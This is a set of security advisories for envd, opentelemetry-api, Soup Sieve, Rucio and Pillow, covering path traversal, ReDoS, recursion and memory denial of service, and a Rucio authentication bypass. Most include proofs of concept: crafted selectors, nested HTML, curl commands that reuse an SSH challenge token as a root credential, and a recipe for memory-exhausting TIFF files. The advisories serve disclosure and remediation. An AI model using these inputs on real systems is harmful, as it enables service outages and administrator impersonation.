entry.title: [envd] envd: Host file disclosure through requirements path traversal and TOCTOU
entry.content:
Summary

envd’s install.python_packages(requirements=...) could read files outside the build context on the host. Content interpreted as dependency entries could appear in build logs and build-step metadata.

Commit f576c92, released in v1.3.5, added path containment validation but left a time-of-check/time-of-use (TOCTOU) race between symlink resolution and opening the requirements file. Commit 9d575b3 addresses this race by opening requirements files through a directory-rooted filesystem handle.

Details

envd reads requirements files on the host to determine whether their contents can be embedded directly into a pip installation build step.

The vulnerable host-side requirements read was introduced in v0.3.38. Version v1.3.5 added containment checks for static path escapes but remained vulnerable to a TOCTOU race. The complete fix is included in v1.3.6.

Before f576c92, this host read lacked a build-context containment check. That commit added frontend path validation and a compile-time check using filepath.EvalSymlinks followed by a containment comparison.

However, symlink resolution returns a pathname rather than a pinned filesystem object. The subsequent os.Open independently resolves that pathname. Concurrent filesystem changes could therefore invalidate the containment check before the file was opened.

The complete fix uses os.OpenRoot and Root.Open to enforce containment during filesystem traversal.

Resources:

  • first commit: be783264fdd79ad7262cea0485b7d449ca514f80
  • Initial containment fix: f576c92
  • TOCTOU fix: 9d575b3

Proof of concept

The security-relevant condition is a requirements-file pathname whose filesystem resolution changes between validation and opening. The containment check describes the filesystem at validation time, while the later pathname-based open may access a different object.

The fix includes a deterministic regression test for the underlying object-pinning guarantee. It opens a context directory handle, moves that directory, and creates a replacement directory at the original pathname containing different requirements. The rooted reader continues reading the original context; a pathname-based reader reads the replacement.

This regression test demonstrates the distinction between rooted and pathname-based reads. It is not an end-to-end demonstration of host file disclosure.

Impact

An attacker who can influence the build input—and, for the residual race in v1.3.5, concurrently modify the relevant filesystem paths—may cause envd to read files outside the intended build context, subject to the permissions of the envd process.

Depending on the file contents and requirements parsing, information may be exposed through dependency debug logs and build-step metadata. This issue does not establish arbitrary code execution or unrestricted disclosure of every file.

v1.3.5 remains affected by the TOCTOU variant. Earlier versions containing the host requirements-reading behavior are affected by the original containment issue; confirm the earliest affected release before setting the advisory’s version range.

Patched version: v1.3.6.

entry.title: [opentelemetry-api] OpenTelemetry Python API: Denial of service through quadratic-time traceparent parsing
entry.content:
Summary

TraceContextTextMapPropagator.extract() in opentelemetry-api is vulnerable to regular expression denial of service (ReDoS) when processing a specially crafted traceparent value.

A malformed value containing a trace-context prefix followed by a long whitespace sequence and an embedded newline triggers quadratic-time regex backtracking. Applications that extract trace context from untrusted carriers accepting such strings can experience excessive CPU consumption and request-processing delays.

When extraction runs on an asynchronous server’s event-loop thread, a single malicious message can delay unrelated requests handled by that event loop.

Exposure conditions

Exploitation requires attacker-controlled input to reach the affected propagator through a carrier that preserves embedded newlines and permits a sufficiently large value.

Conforming HTTP header values cannot contain embedded newlines. However, OpenTelemetry carriers are not restricted to HTTP headers. JSON strings can contain escaped newlines that become newline characters after decoding.

MCP request metadata is one relevant integration path: applications may extract trace context from JSON params._meta. Exposure depends on the MCP SDK or instrumentation version, whether extraction invokes the W3C Trace Context propagator, and applicable message-size limits. HTTP header validation does not constrain a traceparent string carried inside a JSON body.

Authentication requirements depend on the application exposing the carrier.

Impact

The demonstrated impact is denial of service through excessive CPU consumption and blocked request processing. Repeated malicious messages may sustain service degradation.

This finding does not demonstrate data disclosure, data modification, or code execution.

Remediation

Upgrade opentelemetry-api to 1.45.2 or a later release containing the fix.

Version 1.45.2 rejects traceparent values longer than 512 characters before regex matching and removes the overlapping suffix and trailing-whitespace expressions.

Where upgrading is temporarily unavailable, reject oversized values and embedded CR/LF characters before passing untrusted trace-context values to the affected propagator.

entry.title: [soupsieve] Soup Sieve: Exponential ReDoS in selector compilation via \9-run in CSS_ESCAPES/IDENTIFIER
entry.content:
Summary

The IDENTIFIER/CSS_ESCAPES regex (css_parser.py:119-124) exhibits exponential backtracking on a run of ambiguous digit-escapes (\9) in an attribute-name or tag position of an otherwise well-formed selector. It fires at compile time (before the SELECTOR_LIMIT guard) via the public soupsieve.compile() and BeautifulSoup .select().

PoC (verified on soupsieve 2.9.2)

import soupsieve as sv
sv.compile('[a' + '\\9'*26 + '=x]')   # ~57 bytes -> ~10s; ~16x time per +4 chars

Novelty

Distinct from the patched GHSA-836r-... (VALUE regex) and GHSA-2wc2-... (comma-list) advisories, which are fixed in 2.9.2; this is a different regex/vector.

Reachability

CSS selectors are usually developer-controlled, so exposure requires an application that compiles UNTRUSTED selector strings (web-scraping-as-a-service, no-code/query builders, user-defined extraction rules). Where selectors are user-supplied, a ~60-byte string hangs the worker.

Note

This issue was fixed in version 3.0.0, which has been yanked from the PyPI registry. Use versions 3.0.2 and above to upgrade.

References

  • https://github.com/facelessuser/soupsieve/security/advisories/GHSA-6655-6qjp-jx7x

entry.title: [soupsieve] Soup Sieve: Uncontrolled recursion in CSS parser lets nested pseudo-class selectors exhaust the Python call stack
entry.content:
Summary

The Soup Sieve CSS selector parser recurses once per level of nested pseudo-class selector (:is(), :not(), :where(), :has()) without any limit on nesting depth. An unauthenticated attacker who can supply a CSS selector string to soupsieve.compile(), soupsieve.select(), or Beautiful Soup's soup.select() / soup.select_one() can force the parser to exceed Python's recursion limit with a small crafted input (about 1.6 KB, roughly 330 nesting levels), raising an uncontrolled RecursionError. Because this exception is not part of the parser's documented error contract, applications that catch only ValueError or SelectorSyntaxError see an unexpected failure of the request or task that parsed the selector.

Root Cause

The parser dispatches each opening pseudo-class token to parse_pseudo_open, which calls back into parse_selectors to parse the pseudo-class body. Every nesting level therefore adds Python stack frames, and no counter, depth guard, or RecursionError handler bounds this descent. The token-count guard SELECTOR_LIMIT = 8192 (added for the earlier comma-separated-list memory issue) counts parsed tokens, not recursion depth; at the failing nesting depth the token count is only about 330, roughly four percent of that limit, so the guard never fires. The security invariant that untrusted selector input must not be able to exhaust interpreter resources is not enforced for nesting depth.

soupsieve/css_parser.py
  CSSParser.parse_pseudo_open (line 985): sel.selectors.append(self.parse_selectors(iselector, index, flags))
  CSSParser.parse_selectors  (line 1137): recursive target; dispatches pseudo-class tokens back into parse_pseudo_class -> parse_pseudo_open
  CSSParser.increment_count  (lines 707-712): SELECTOR_LIMIT token guard; increments once per nesting level, cannot bound depth

Impact

Any application that compiles or evaluates untrusted CSS selectors through Soup Sieve (directly or via Beautiful Soup) is affected. No authentication, privilege, or user interaction is required; the failure occurs during selector parsing, before any document is matched. A single crafted selector of about 1.6 KB reliably raises RecursionError. The demonstrated capability is a transient denial of the individual request, task, or invocation that parsed the malicious selector: the exception propagates uncaught unless the caller handles RecursionError (or a broad except Exception). The RecursionError in CPython 3.x is a recoverable stack unwind, not an interpreter crash or persistent resource exhaustion, and it carries no confidentiality or integrity impact. Applications following the parser's documented error pattern (catching ValueError / SelectorSyntaxError) will not catch it, so a repeated stream of such selectors can plausibly cause repeated per-request failures; this per-request availability effect is the demonstrated consequence, not a service-wide or amplified outage.

Proof of Concept

Requires only an installed Soup Sieve (any release from 0.4 through 2.10) and a default CPython recursion limit of 1000. No Beautiful Soup document or network setup is needed.

import soupsieve as sv

# ~330 levels of nested :is() around a single tag: about 1.6 KB of input.
depth = 330
selector = ":is(" * depth + "a" + ")" * depth
print("selector length:", len(selector))
sv.compile(selector)

selector length: 1651
Traceback (most recent call last):
  ...
  File ".../soupsieve/css_parser.py", line 985, in parse_pseudo_open
    sel.selectors.append(self.parse_selectors(iselector, index, flags))
RecursionError: maximum recursion depth exceeded

The same failure was reproduced with :not(), :where(), and :has(), and through BeautifulSoup(...).select(selector). A negative control at depth 100 compiles successfully with a token count of 101, confirming the token guard is far from firing.

Attack Chain

  1. Exposure: The application exposes soupsieve.compile() / select() or Beautiful Soup's .select() / .select_one() to attacker-influenced CSS selector input. These are the library's primary public API and ship enabled by default; Soup Sieve is an automatic dependency of Beautiful Soup 4.
  2. Control: The attacker fully controls the selector string. The nested pseudo-class pattern (:is(:is(...a...))) survives tokenization and normalization unchanged.
  3. Path: compile() reaches CSSParser.process_selectors() and then parse_selectors(), which dispatches each pseudo-class token through parse_pseudo_class() into parse_pseudo_open(), which calls parse_selectors() again, once per nesting level.
  4. Guard: The only resource guard is the SELECTOR_LIMIT token counter, which reaches about 330 at the failing depth versus its limit of 8192, so it never fires. No recursion-depth counter and no RecursionError handler exist anywhere in the package.
  5. Primitive: Python's recursion limit is exceeded during parsing, raising an uncontrolled RecursionError.
  6. Result: The unhandled RecursionError propagates to the caller, failing the request, task, or process invocation that parsed the selector, outside the parser's documented ValueError / SelectorSyntaxError error contract.

Bypass Evidence

The relevant existing guard is the SELECTOR_LIMIT = 8192 token counter in increment_count(). It does not block this path: it increments once per nesting level, so at the failing depth of about 330 the count is roughly 330 (about four percent of 8192), verified by instrumenting increment_count and observing a maximum count of 329 at the point RecursionError was raised. A search of the package for RecursionError and RuntimeError handlers returns no matches, so nothing catches the error internally, and functools.lru_cache on the compile path does not cache exceptions. Attempts to invalidate the finding were made and failed: raising the interpreter recursion limit only shifts the required nesting depth (a proportionally larger but still small selector), and a broad except Exception in the caller does catch the error but the parser's documented contract raises only ValueError / SelectorSyntaxError, so callers coded to that contract remain exposed. This is a distinct weakness from the prior comma-separated-list memory-exhaustion advisory: that issue exhausts heap memory through linear object expansion and was addressed by the token count limit, whereas this issue exhausts the call stack through unbounded recursion depth and is not addressed by any released version, including 2.8.4 which was independently confirmed to still raise RecursionError on this input.

Affected Versions

  • Ecosystem: pip (PyPI)
  • Package: soupsieve
  • Confirmed affected range: >= 0.4, <= 2.10
  • Latest release checked: soupsieve 2.10 (PyPI, latest published release as of 2026-09-25)
  • Fix status: not fixed in any released version

The recursive parse_pseudo_open to parse_selectors structure is present in the earliest PyPI release (0.4) and in every subsequent release through the current 2.10, verified against the published PyPI source artifacts. Version 2.5, release 2.8.4 (which added that token-count limit), and 2.10 were each executed and confirmed to raise RecursionError on the crafted input. No released version adds a recursion-depth limit; the token-count SELECTOR_LIMIT introduced in 2.8.4 is architecturally unable to bound nesting depth. There is no registry or tag disagreement and no package or module path change.

Possible Solution

Python's RecursionError is sometimes a contested issue related to security. The Soup Sieve project does not consider it "uncontrolled" and allows it to be raised to indicate Python's maximum recursion depth was reached, and allows it to fail to prevent overflows, a much worse and real security vulnerability. With that said, the algorithm can be reworked to be non-recursive, allowing the selector limit check to now capture and raise an exception. In addition, the limit could be exposed to the user to give them better control.

Mitigation

For those on older versions where the algorithm is still recursive, a try/except block that captures RecursionError can be added around calls if accepting untrusted user input is allowed.

Note

This issue was fixed in version 3.0.0, which has been yanked from the PyPI registry. Use versions 3.0.2 and above to upgrade.

Reported by zx (GitHub: @manus-pi).

entry.title: [rucio] Rucio: Unauthenticated administrator impersonation through SSH challenge tokens
entry.content:
Summary

SSH challenge tokens are mistakenly accepted as valid credentials during the authentication token validation process.

While an SSH challenge token is intended as a short-lived nonce for use in a subsequent SSH key exchange, the function to validate authentication tokens does not differentiate between these and actual authentication tokens. Because challenge tokens are generated based on an account name provided via headers without requiring prior authentication, an unauthenticated attacker can request a valid "challenge" token for any account (including administrative ones) and use it to authenticate against other API endpoints.

Proof of Concept

The vulnerability exists because SSH challenge tokens are stored in the same database table as regular authentication tokens and validate_auth_token in lib/rucio/core/authentication.py accepts these "challenge" tokens. An attacker can obtain a challenge token for an account such as “root” via the REST API and then present it as a valid authentication bearer token:

  1. Request a challenge token for an arbitrary account (e.g., "root"): curl -i -H "X-Rucio-Account: root" https://rucio/auth/ssh_challenge_token
  2. The server returns a 200 OK with the header X-Rucio-SSH-Challenge-Token.
  3. The attacker can then use this specific token within the ten-second challenge lifetime as an authentication credential in subsequent requests to the Rucio API: curl -H "X-Rucio-Auth-Token: $CHALLENGE_TOKEN" https://rucio/accounts/whoami

entry.title: [soupsieve] Soup Sieve: Polynomial-time denial of service in the descendant combinator
entry.content:
Summary

Matching a selector that uses the descendant combinator (a b) takes time that grows polynomially with how deeply the document is nested, and each extra descendant combinator in the selector raises the degree by one. A selector with k descendant combinators takes O(n^(k+1)) time on a chain of n nested elements.

An attacker who controls the HTML or XML that an application passes to Soup Sieve (directly, or through Beautiful Soup's select(), select_one(), css.select(), etc.) can send a very small, deeply nested document that keeps a CPU busy for seconds to minutes against an ordinary selector such as section div div.

Details

To match a b, Soup Sieve checks each element against b and then walks up through its ancestors looking for one that matches a. When the selector has more descendant combinators, the rest of the selector is tried again from each ancestor on that walk, and so on for every combinator. Nothing was reused between walks, so the same ancestors were matched against the same part of the selector over and over.

The worst case is when the leftmost part of the selector never matches, as in section div div against a document of nested <div> with no <section>: every walk goes all the way to the root and no search can stop early.

Timings

Example timings with html.parser on Soup Sieve 3.0.4 and 4.0, using a document of nested <div> (5 bytes each) and no matches:

Nesting depth Input size Selector 3.0.4 4.0
2,000 10 KB section div 1.6 s 0.05 s
4,000 20 KB section div 5.1 s 0.01 s
400 2 KB section div div 6.7 s < 0.01 s
800 4 KB section div div 53.0 s < 0.01 s
100 0.5 KB section div div div 2.5 s < 0.01 s
200 1 KB section div div div 40.9 s < 0.01 s

None of these selectors use unusual syntax.

Proof of concept

import time
import bs4
import soupsieve as sv

soup = bs4.BeautifulSoup('<div>' * 200, 'html.parser')
t = time.process_time()
sv.select('section div div div', soup)
print(time.process_time() - t)

On affected versions, doubling the nesting depth multiplies the time by about 2^(k+1), where k is the number of descendant combinators: about 4x for section div, 8x for section div div, and 16x for section div div div.

Impact

Applications are affected if they run selectors with descendant combinators against documents that untrusted users can influence, such as scrapers, HTML sanitizers or filters, and services that process uploaded or fetched markup. Descendant combinators are among the most common parts of CSS selectors, and a document of about 1 KB is enough to tie up a worker for close to a minute. Applications that only run selectors against trusted documents are not affected.

Patches

Fixed in 4.0 by facelessuser/soupsieve#351. Whether an element is, or has an ancestor that is, a match for part of a selector depends only on its parent, so Soup Sieve now caches that result per element and relation for every element visited on the walk. Each descendant combinator is then linear in the size of the document. Results are unchanged, and ordinary documents are no slower.

Caching is enabled by default, so no changes are needed beyond upgrading. The NOCACHE flag is a temporary fallback for users who run into problems with caching, and it is planned for removal. It uses the old uncached matching, so selectors compiled with NOCACHE are still subject to polynomial time and shouldn't be used with descendant combinators on untrusted input.

Workarounds

If users can't upgrade:

  • Use as few descendant combinators as they can in selectors that run on untrusted documents. Where the structure of the document is known, the child combinator (a > b) only looks at the parent and is not affected.
  • Limit the size and nesting depth of untrusted documents before selecting on them.
  • Run selection on untrusted input with a time limit, for example in a worker process that can be stopped.

References

entry.title: [soupsieve] Soup Sieve: General sibling combinator inside :has() matches untrusted HTML in quadratic time
entry.content:
Summary

Matching a selector that puts a general-sibling combinator inside :has(), such as div:has(a ~ b), against untrusted HTML runs in O(n²) time in the number of sibling elements. A single small document with a few thousand siblings ties the process up for a minute of CPU, so an application that runs a fixed selector of this shape over HTML it doesn't control can be stalled by one request.

:has is powerful, but much in the same way poor regular expressions can be crafted to cause catastrophic backtracking with greedy capturing, has can be used to create non-ideal scenarios that can cause large portions of the tree to be evaluated for one or many elements if not used thoughtfully.

This behavior is not exclusive to Soup Sieve, but browsers make note of these potential performance issues themselves: https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Selectors/:has#performance_considerations.

With all of that said, there is room for improvements that can in some cases greatly improve performance.

Details

:has(a ~ b) asks "does this element contain an a that has a later sibling b?". When no b is present, soupsieve can't short-circuit, and it answers the question with a nested scan: match_future_child walks every candidate a under the scope, and for each one the general-sibling branch of match_future_relations walks all of that a's following siblings looking for b. With n siblings that is (n-1) + (n-2) + ... + 1 comparisons, i.e. O(n²).

The adjacent-sibling form div:has(a + b) stays linear, because its branch checks only the one immediately following sibling per candidate. So the cost is specific to the general-sibling ~ (and ~ nested inside :has), and it shows up on the common case where the right-hand side simply isn't there.

Proof of concept

Installed from PyPI: pip install soupsieve==2.9.2 beautifulsoup4.

import time
import soupsieve
from bs4 import BeautifulSoup

selector = "div:has(a ~ b)"

for n in (1000, 2000, 4000, 8000):
    html = "<div>" + ("<a></a>" * n) + "</div>"
    soup = BeautifulSoup(html, "html.parser")
    start = time.perf_counter()
    soupsieve.select(selector, soup)
    print(n, round((time.perf_counter() - start) * 1000), "ms")

Measured:

n=1000    837 ms
n=2000   3667 ms
n=4000  14797 ms
n=8000  59746 ms

Time quadruples for each doubling of n. The n=8000 input is a ~56 KB HTML fragment.

Impact

Availability. Any caller that evaluates a fixed selector containing a general sibling under :has() over attacker-controlled markup can be forced to spend minutes of CPU on a small input. The selector is developer-authored and ordinary; the untrusted part is the HTML, which is soupsieve's normal input.

A single-pass evaluation of the sibling run (remember whether an a has been seen while scanning the siblings once) would make this case linear.

Mitigation

Quadratic time for :has in some circumstances is expected and not a bug. While we've made optimizations and there may be more in the future, the way :has is designed to operate will never perform in linear time in all circumstances. Users should thoughtfully apply the use of :has.

The anchor selector (the A in A:has(B)) should not be an element that has too many children. Additionally, too general an anchor, such as *, can cause :has() to be applied to every element.

Further, it is recommended that the inner selector (the B in A:has(B)) should use combinators like > or + to limit traversal. When the selector inside :has() is not tightly constrained, Soup Sieve might need to traverse the entire subtree of the anchor element to check the condition.

If the risk for a given project is too great, user input can be scanned for usage of :has and be denied. Calls can also be wrapped in a timeout to prevent long-running processes as well.

References

  • https://github.com/facelessuser/soupsieve/security/advisories/GHSA-4j63-6c4x-wfg4
  • https://nvd.nist.gov/vuln/detail/CVE-2026-126192
  • https://github.com/facelessuser/soupsieve/pull/304

entry.title: [Pillow] Pillow: Memory DoS in TIFF and EXIF IFD parsing via overlapping tag data
entry.content:
============================================================================
ANT-2026-D7STJUWL  [medium]  CWE-770  dos
Memory DoS in TIFF and EXIF IFD parsing via overlapping tag data
Location: src/PIL/TiffImagePlugin.py:927  in ImageFileDirectory_v2.load()
Commit:   a707c6b21c313880d0771e54965d142dd42358b6
============================================================================

A small, crafted image file can make Pillow use thousands of times its own size in memory while the file is only being opened, which lets anyone who can submit an image crash or stall the process handling it. A 144 KB TIFF makes Image.open() return normally while holding 1.6 GiB of memory. The largest such standard TIFF, about 786 KB, asks for roughly 48 GiB, which in practice gets the worker killed by the operating system. The file declares a 1×1 image, so the decompression-bomb check never triggers and no warning is raised. There is no memory corruption; the impact is denial of service.

The bug is in ImageFileDirectory_v2.load() in src/PIL/TiffImagePlugin.py (around line 927). For every directory entry whose value is stored elsewhere in the file, it reads that value into a new bytes object with ImageFile._safe_read(fp, count * unit_size) and keeps it in _tagdata. _safe_read() only checks that the bytes exist. Nothing limits the total read across entries, and nothing stops every entry from pointing at the same bytes. An attacker can therefore give each of N distinct private tags an offset and count that covers the whole file, at a cost of 12 bytes per entry. Memory grows as N × file size, which is quadratic in the file size, and BigTIFF removes the 65,535-entry ceiling.

The same loop parses EXIF data, so the problem reaches beyond TIFF:

  • A 66 KB JPEG APP1 segment costs about 340 MiB inside Image.open() itself, via _read_dpi_from_exif().
  • A 96 KB PNG eXIf chunk costs 754 MiB on getexif() or ImageOps.exif_transpose().
  • WebP EXIF and MPO reach the same code.

The attached reproducer builds a 72 KB TIFF and a 72 KB PNG. Using only Image.open() and getexif(), each causes 412 MiB of tag data to be retained, about 6,000 times the file size. The loop dates to the original PIL 1.1.7 import, so every Pillow release since 1.0 is affected.

Details

TiffImagePlugin.ImageFileDirectory_v2.load() reads the out-of-line value of every IFD entry into its own bytes object and keeps it in self._tagdata. Nothing bounds the sum of those reads, and nothing prevents every entry from pointing at the same region of the file. An IFD with N entries whose (offset, count) each cover the whole file therefore costs N × filesize bytes of memory, while the IFD itself costs only 12 bytes per entry. This one loop is the IFD parser for TIFF frames and for Image.Exif alike, so it is reachable from Image.open() on a TIFF or JPEG and from getexif() / ImageOps.exif_transpose() on PNG, JPEG, WebP and MPO.

Observed on the stock build at this commit: a valid 144,110-byte 1×1 greyscale TIFF with 12,000 such entries makes Image.open() return normally (no exception, no warning, 1 declared pixel so MAX_IMAGE_PIXELS is irrelevant) after 1.5 s, with the process RSS grown from 15 MiB to 1,671 MiB and im.tag_v2 holding 1,649 MiB of tag data for as long as the image object lives. The same IFD placed in the eXIf chunk of a 96 KB PNG makes im.getexif() retain 754 MiB. A 65,870-byte JPEG whose APP1 Exif segment is such an IFD (5,400 entries × 65,519 bytes) allocates ~340 MiB inside Image.open() itself, with no further call.

# src/PIL/TiffImagePlugin.py:902-946  (ImageFileDirectory_v2.load)
for i in range(tag_count):
    tag, typ, count, data = ( … self._unpack("HHL4s", self._ensure_read(fp, 12)))
    …
    size = count * unit_size                         # 918: attacker-chosen
    if size > (8 if self._bigtiff else 4):
        here = fp.tell()
        (offset,) = self._unpack("Q" if self._bigtiff else "L", data)
        …
        fp.seek(offset)                              # 926: attacker-chosen
        data = ImageFile._safe_read(fp, size)        # 927: new bytes object of `size`
        fp.seek(here)
    …
    self._tagdata[tag] = data                        # 945: kept
    self.tagtype[tag] = typ

ImageFile._safe_read() only guarantees that size bytes are actually present in the stream (it reads in SAFEBLOCK chunks and raises on truncation); it is a guard against allocating for data that does not exist, not against reading the same existing data many times. For a well-formed file each entry points at its own disjoint value, so the total read is at most the file size. For the crafted file every one of the N entries has a distinct tag number (so none overwrites another in _tagdata), type BYTE, count = filesize - 1 and offset = 1; each iteration allocates and fills a fresh filesize - 1-byte object and stores it. load() does not care whether the tag number is known or whether the type makes sense for it; any 16-bit tag number and any type in _load_dispatch is accepted. Memory is N × filesize, and since filesize ≈ 12 N, it is quadratic in the file size: 12,000 entries / 144 KB → 1.6 GiB (measured); the classic-TIFF maximum of 65,535 entries / 786 KB → ~48 GiB; BigTIFF (tag_count is a Q) has no 16-bit entry limit at all.

Reachability:

  • TIFF: TiffImageFile._open() (TiffImagePlugin.py:1187) → self._seek(0) (:1210) → self.tag_v2.load(self.fp) (:1258, and again at :1271). This runs inside Image.open(), before load() and before any size check (_decompression_bomb_check only looks at width × height and is satisfied by the 1×1 image), and the resulting directory stays referenced as im.tag_v2. _seek() parses the IFD twice, but reset() drops the first copy, so the peak does not double; it is paid again for every frame on seek()/n_frames.
  • EXIF in other formats: Image.Exif.load() / load_from_fp() / _get_ifd_dict() (Image.py:4146-4196, :4119-4133) wrap the same ImageFileDirectory_v2.load() around the EXIF blob. PngImagePlugin.chunk_eXIf (PngImagePlugin.py:697) stores the whole chunk as info["exif"], JpegImagePlugin concatenates APP1 Exif segments into info["exif"] (JpegImagePlugin.py:114-117), and WebP exposes its EXIF chunk the same way; im.getexif(), ImageOps.exif_transpose() and _getexif() then parse it and keep the values in im._exif. For JPEG no explicit call is needed: JpegImageFile._open() ends with self._read_dpi_from_exif() (JpegImagePlugin.py:413), which calls getexif() whenever no JFIF DPI is present, so the APP1 IFD is parsed during Image.open(). Note that an EXIF blob is parsed into several IFDs (main, EXIF, GPS, Interop via _get_ifd_dict), each through its own load() call.

The only failure path in load() is except OSError → warning; running out of memory is not an OSError, so on Linux the realistic outcome for a larger N is the kernel OOM killer terminating the process rather than a Python exception.

The loop predates Pillow: it came in with the PIL 1.1.7 import in 9a640e315715 ("Forking PIL", 2010-07-30) and was carried over unchanged into ImageFileDirectory_v2, so every release since 1.0 is affected. The per-tag _safe_read bounding added in the CVE-2019-16865 era does not address the sum.

Impact

Any service that calls Image.open() on an uploaded TIFF or JPEG — or getexif() / ImageOps.exif_transpose() on an uploaded PNG, JPEG or WebP, which thumbnailers routinely do to honour orientation — can be made to allocate and retain memory roughly entries × filesize, i.e. thousands of times the upload size, from a file of a few hundred KB that declares a 1×1 image and passes the decompression-bomb check. A ~800 KB TIFF requests ~48 GiB; in practice the worker (or its container) is OOM-killed within seconds, taking down all requests it was serving, and repeated uploads keep it down. No pixel decoding, load(), or further API call is required for the TIFF and JPEG cases, MAX_IMAGE_PIXELS does not apply, and no DecompressionBomb* warning gives the application a chance to refuse the file. There is no memory corruption; the effect is denial of service of the process handling the input.

This is the same class as CVE-2021-27921/27922/27923 (BLP/ICNS/ICO "arbitrarily large memory allocations" from unchecked reported sizes, fixed in 8.1.2) and CVE-2021-28675 (PSD layer count not checked against the data size, DoS on Image.open() prior to load()), here in the TIFF/EXIF directory parser shared by several formats.

Reproducing

repro is a single Python script that runs against the stock Pillow in /src; nothing is compiled. It needs about 1 GB of free RAM (it caps its own address space at 4 GiB so that a larger run ends in MemoryError rather than the OOM killer).

Input. aliased_ifd() builds, in memory, a little-endian classic TIFF: an 8-byte header, one IFD, nothing else. Every crafted entry is a private tag (1000 upwards) of type BYTE with offset = 1 and count = file size - 1, i.e. each claims the whole file body as its value. Each costs 12 bytes in the file but a full file-sized read in ImageFileDirectory_v2.load().

TIFF path. The first file adds 8 ordinary tags (ImageWidth = ImageLength = 1, BitsPerSample = 8, no compression, BlackIsZero, one 1-byte strip pointing at a header byte) so that Pillow accepts it as a 1×1 L image, plus 6,000 aliased tags (72,110 bytes). Because the image is 1×1, MAX_IMAGE_PIXELS never comes into play. The script calls Image.open() on it and nothing else: no load(), no pixel access.

EXIF path. The same 6,000-entry IFD (without the image tags) is passed as exif= when saving a 1×1 PNG, so it lands in an eXIf chunk; the script opens that PNG and calls im.getexif(), which is what ImageOps.exif_transpose() calls.

Check. For each path the script reads VmRSS from /proc/self/status before and after, and adds up len() over the resulting directory's _tagdata. In a well-formed IFD each entry points at its own bytes, so the tag data can never be larger than the file. The script prints BUG if both the TIFF's im.tag_v2 and the PNG's EXIF directory hold more than 2000× the size of their file, otherwise OK. On this commit each holds 412 MiB (~6000× the file) and RSS grows by about as much for each.

The memory cost is entries × file size, and the file size itself grows at 12 bytes per entry, so the cost is quadratic: doubling to 12,000 entries (144 KB) gives the 1.6 GiB quoted above, and the classic-TIFF maximum of 65,535 entries (~786 KB file) comes to ~48 GiB. A JPEG APP1 segment or a WebP EXIF chunk carrying the same IFD behaves like the PNG case (for JPEG, already during Image.open()).

Suggested fix

The attached patch bounds the out-of-line tag data a single ImageFileDirectory_v2.load() call may pull in by the length of the stream it reads from. The values of a well-formed IFD do not overlap, so their total can never exceed the file; only aliased entries can push past it. load() now measures the stream once on entry (fp.seek(0, io.SEEK_END), then back to self._offset; load() already requires a seekable fp, since both the TIFF plugin and Exif do), keeps a running total_size of out-of-line values, and, before the fp.seek(offset) / _safe_read() at TiffImagePlugin.py:926-927, warns "Tag data larger than file. Skipping tag …" and continues for any entry that would take the total past the file size, in the same warn-and-skip idiom as the existing "Tag offset too large" check. No fixed constant is introduced and no valid file changes behaviour, including TIFFs with very large Photoshop/ImageSourceData (tag 37724) payloads, which routinely exceed 64 MB. Because Image.Exif, the PNG/JPEG/WebP EXIF paths and MPO all go through this one method, they are covered too. The patch adds test_tag_data_larger_than_file to Tests/test_file_tiff_metadata.py, next to test_tag_offset. With it applied, both paths in the reproducer drop to 1× the file size. One visible side effect: a single oversize entry now skips that tag with this warning instead of aborting the rest of the IFD via the OSError path.

A fixed module-level cap in the style of PngImagePlugin.MAX_TEXT_MEMORY (e.g. a 64 MiB TiffImagePlugin.MAX_IFD_DATA) would be the weaker alternative on its own: a 140 KB file could still retain ~63 MiB per IFD — and a JPEG's EXIF is parsed into several IFDs (main, EXIF, GPS, Interop), so a 66 KB APP1 segment could still request roughly 1000× its size — and legitimate TIFFs with more than 64 MiB of tag data would lose those tags with a warning. It could still be added on top of the stream-length check as a user-adjustable knob.

An alternative that removes the amplification entirely is to store (offset, size) in _tagdata and read lazily in __getitem__, which is what the class docstring already describes ("we don't decode tags unless they're asked for"); that is a larger change because _tagdata is shared with ImageFileDirectory_v1 (from_v2/to_v2) and exposed as the legacy tagdata property, and lazy reads would need the file object to still be open when a tag is first accessed.

The patch

Skip IFD entries once the total out-of-line tag data read by ImageFileDirectory_v2.load() would exceed the size of the stream

Applies to src/PIL/TiffImagePlugin.py at the commit above.

diff --git a/Tests/test_file_tiff_metadata.py b/Tests/test_file_tiff_metadata.py
index 7b35a0196..ccf923128 100644
--- a/Tests/test_file_tiff_metadata.py
+++ b/Tests/test_file_tiff_metadata.py
@@ -500,6 +500,21 @@ def test_tag_offset() -> None:
         ifd.load(f)
 
 
+def test_tag_data_larger_than_file() -> None:
+    ifd = TiffImagePlugin.ImageFileDirectory_v2()
+
+    # Two BYTE tags that both claim the whole 30 byte IFD as their value
+    tag_count = struct.pack("<H", 2)
+    tags = struct.pack("<HHLL", 0, 1, 30, 0) + struct.pack("<HHLL", 1, 1, 30, 0)
+    next_offset = struct.pack("<L", 0)
+
+    f = io.BytesIO(tag_count + tags + next_offset)
+    with pytest.warns(UserWarning, match="Tag data larger than file"):
+        ifd.load(f)
+    assert len(ifd[0]) == 30
+    assert 1 not in ifd
+
+

     base_ifd = TiffImagePlugin.ImageFileDirectory_v2()
     interop_ifd = TiffImagePlugin.ImageFileDirectory_v2(group=40965)
diff --git a/src/PIL/TiffImagePlugin.py b/src/PIL/TiffImagePlugin.py
index 42c1cc96c..c9d506933 100644
--- a/src/PIL/TiffImagePlugin.py
+++ b/src/PIL/TiffImagePlugin.py
@@ -892,6 +892,9 @@ class ImageFileDirectory_v2(_IFDv2Base):

+        fp.seek(0, io.SEEK_END)
+        file_size = fp.tell()
+        fp.seek(self._offset)
 
         try:
             tag_count = (
@@ -899,6 +902,7 @@ class ImageFileDirectory_v2(_IFDv2Base):

                 else self._unpack("H", self._ensure_read(fp, 2))
             )[0]
+            total_size = 0
             for i in range(tag_count):
                 tag, typ, count, data = (
                     self._unpack("HHQ8s", self._ensure_read(fp, 20))
@@ -923,6 +927,16 @@ class ImageFileDirectory_v2(_IFDv2Base):

                         warnings.warn("Tag offset too large")
                         continue

+                    # total they cannot be larger than the file they are read
+                    # from. Do not let entries that alias the same bytes load
+                    # many copies of it.
+                    total_size += size
+                    if total_size > file_size:
+                        warnings.warn(
+                            f"Tag data larger than file. Skipping tag {tag}"
+                        )
+                        continue

                     data = ImageFile._safe_read(fp, size)
                     fp.seek(here)

The reproducer

Reproducer — repro, 2,254 bytes (click to open)

Its last line is BUG when the issue triggers and OK when it does not. Re-run on a clean build of that commit it printed BUG.

